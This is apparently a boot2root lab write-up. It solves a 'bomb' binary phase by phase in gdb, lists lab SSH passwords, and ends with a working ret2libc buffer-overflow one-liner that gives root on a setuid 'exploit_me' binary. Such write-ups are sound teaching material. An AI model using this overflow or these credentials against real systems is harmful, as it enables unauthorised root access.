# Writeup 2

## SSH Connection

In writeup 1, we have seen how to get access to ssh credentials. We are going to use them like so
```
$ ssh laurie@192.168.80.128 -p 4242
```
With the following password
```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

## /home/laurie/

Now that we are connected as **laurie**, let's find out where we are and what we have.

```
$ pwd ; ls
/home/laurie
README  bomb
```

To crack the bomb binary we will use gdb as fuck...
```
$ gdb ./bomb
```

The bomb contains several phases named **phase_1, phase_2, etc.**

For each step we will use the following command

```
(gdb) disas phase_N
```

### Phase 1 : "Public speaking is very easy."

The address **0x80497c0** is pushed on the stack and contains the string "Public speaking is very easy.".

```
(gdb) disas phase_1
0x08048b2c <+12>:	push   0x80497c0
0x08048b31 <+17>:	push   eax

(gdb) x/s 0x80497c0
0x80497c0:	 "Public speaking is very easy."
```

The function **strings_not_equal** is called right after with 2 arguments, our input line and this string.

```
(gdb) disas phase_1
0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
```

The reversed version of the function is the following.

```
int		phase_1(char *line)
{
	if (strings_not_equal(line, "Public speaking is very easy.") != 0)
		explode_bomb();
	return (0);
}
```

### Phase 2 : "1 2 6 24 120 720"

The function **read_six_numbers** expects 6 integers from input line separated by white spaces.  

```
(gdb) disas phase_2
0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
```

It checks whether the 1st number is a 1.

```
(gdb) disas phase_2
0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
```

Then the next number must be the current number multiplied by the next position on the string.

```
1 at position 1 = 1
1 at position 2 = 2
2 at position 3 = 6
6 at position 4 = 24
etc ...
```

The reversed version of the function is the following.

```
int		phase_2(char *line)
{
	int		numbers[6] = {0};
	int		count = 0;

	read_six_numbers(*line, &numbers);
	if (numbers[0] != 1)
		explode_bomb();
	while (count < 5)
	{
		if (numbers[count] * (count + 1) != numbers[count + 1])
			explode_bomb();
		count += 1;
	}
	return (0);
}
```


### Phase 3 : "1 b 214"

The address **0x80497de** is push on the stack before a call to sscanf and contains the string "%d %c %d".

```
(gdb) disas phase_3
0x08048bb1 <+25>:	push   0x80497de
0x08048bb6 <+30>:	push   edx
0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>

(gdb) x/s 0x80497de
0x80497de:	 "%d %c %d"
```
According to the README file the char passed to sscanf should be a 'b' leaving us with 3 solutions : "1 b 214", "2 b 755" and "7 b 524".  
The reversed version of the function is the following.

```
int		phase_3(void)
{
	int		ebp_4;
	char	ebp_5;
	int		ebp_12;
	char	bl;
	int		ret;

	if (sscanf("%d %c %d", &ebp_12, &ebp_5, &ebp_4) <= 2)
		explode_bomb();
	switch (ebp_12)
	{
		case 0:
			bl = 'q';
			if (ebp_4 != 777) explode_bomb();
			break;
		case 1:
			bl = 'b';
			if (ebp_4 != 214) explode_bomb();
			break;

		case 2:
			bl = 'b';
			if (ebp_4 != 755) explode_bomb();
			break;

		case 3:
			bl = 'k';
			if (ebp_4 != 251) explode_bomb();
			break;

		case 4:
			bl = 'o';
			if (ebp_4 != 160) explode_bomb();
			break;

		case 5:
			bl = 't';
			if (ebp_4 != 458) explode_bomb();
			break;

		case 6:
			bl = 'v';
			if (ebp_4 != 780) explode_bomb();
			break;

		case 7:
			bl = 'b';
			if (ebp_4 != 524) explode_bomb();
			break;

		default:
			bl = 'x';
			explode_bomb();
	}

	if (bl != ebp_5)
		explode_bomb();
	return (0);
}
```

### Phase 4 : "9"

The address **0x8049808** is push on the stack before a call to sscanf and contains the string "%d".

```
(gdb) disas phase_4
0x08048cf0 <+16>:	push   0x8049808

(gdb) x/s 0x8049808
0x8049808:	 "%d"
```

After the call to **func4**, the **EAX** register must be equal to **0x37**.

```
0x08048d15 <+53>:	call   0x8048ca0 <func4>
0x08048d1d <+61>:	cmp    eax,0x37

```

Within a few tries, we easily find the solution.  
The reversed version of the function is the following.

```
int		phase_4(char *line)
{
	int		number;

	if (sscanf("%d", &number) != 1)
		explode_bomb();
	if (number <= 0)
		explode_bomb();
	if (func4(number) != 0x37)
		explode_bomb();
	return (0);
}

```

### Phase 5 : "opekmq"

The input string must be 6 bytes long.

```
(gdb) disas phase_5
0x08048d3b <+15>:	call   0x8049018 <string_length>
0x08048d43 <+23>:	cmp    eax,0x6
```

It must somehow translate to "giants".

```
(gdb) disas phase_5
0x08048d72 <+70>:	push   0x804980b
0x08048d77 <+75>:	lea    eax,[ebp-0x8]
0x08048d7a <+78>:	push   eax
0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>

(gdb) x/s 0x804980b
0x804980b:	 "giants"
```

Digging into the code we find the following string.

```
(gdb) disas phase_5
0x08048d52 <+38>:	mov    esi,0x804b220

(gdb) x/s 0x804b220
0x804b220 <array.123>:	 "isrveawhobpnutfg\260\001"
```

Matching the previous string to the alphabet we can see the following correspondence pattern.

```
 abcdefghijklmno
pqrstuvwxyz
----------------
isrveawhobpnutfg
```

Meaning for example that 'a' becomes 's', 'b' becomes 'r' ... We then just have to find the right characters that translate to "giants".
This leaves us with these possible solutions: "op[eu]km[aq]".  

The reversed version of the function is the following.

```
int		phase_5(char *line)
{
	int		count = 0;
	char	table[] = "isrveawhobpnutfg";

	if (string_length(line) != 6)
		explode_bomb();

	for (count = 0 ; count <= 5 ; count++)
		line[count] = table[line[count] & 0xf];

	if (strings_not_equal(line, "giants") != 0)
		explode_bomb();

	return (0);
}
```

### Phase 6 : "4 2 6 3 1 5"

```
nodes = {253} -> {725} -> {301} -> {997} -> {212} -> {432}

int		phase_6(char *line)
{
	int	numbers[6] = {0};

	read_six_numbers(line, &numbers);
	for (int i = 0 ; i < 6 ; i++)
	{
		for (int j = 0 ; j < 6 ; j++)
		{
			if (i != j && numbers[i] == numbers[j])
			{
				explode_bomb();
			}
		}
	}

	/***************************************/
	/** sorting nodes in numbers order    **/
	/***************************************/

	for (int i = 0 ; i <= 5 ; i++)
	{
		if (node->val < node->next->val)
			expode_bomb();
	    node = node->next;
	}
}

```
We see at the end of the phase 6 that we check if nodes are decrementialy sorted. The order of nodes is set with our input.
We have the initial order, so we can determine the good input:

```
  1        2        3        4        5        6
{253} -> {725} -> {301} -> {997} -> {212} -> {432}

  4        2        6        3        1        5
{997} -> {725} -> {432} -> {301} -> {253} -> {212}
```


### Phase Bonus
For this one we need to rewrite phase_4 like this **"9 austinpowers"** and add an extra line which is **"1001"**.  
It is useless as fuck by the way...

### All together

If we concatenated all the phases we found it gives us something like

```
Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

But according to the forum, the characters at len-2 and len-3 must be switched, so to connect with ssh as **thor** we must use

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## /home/thor/

In this directory we find two files

```
$ ls
README  turtle
```

The turtle file is actually a draw map for letters that gives us

```
SLASH
```

It is said in the README file that the result is to be used with **zaz** user. Encrypting it in sha1-2-256 didn't work so we try in md5 and... it works !

```
646da671ca01bb5d84dbb5fb2238dc8e
```

## /home/zaz/

In this directory we find

```
$ ls
exploit_me  mail
```

If we open **exploit_me** into gdb we notice that we can use a buffer overflow attack and overwrite the **EIP** register due to the use of an unprotected **strcpy**.

```
(gdb) disas main
0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
```

The stack frame is set at 144 bytes.

```
(gdb) disas main
0x080483fa <+6>:	sub    esp,0x90
```

Playing around with the command line we can make the program crash at 140 bytes.

```
$ ./exploit_me $(python -c "print('A' * 140)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Since the file has root permissions, we can spawn a shell with a ret2libc attack.
The strategy would be the following
- We use gdb to find the address of the **system** function and the **/bin/bash** string
- We overwrite the **EIP register** with the address of **system**
- We push on the stack at [EIP + 8] the address of **/bin/sh**

```
(gdb) b *main
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```

We put this all together in python
```
$ ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```

## Tadam

Have fun
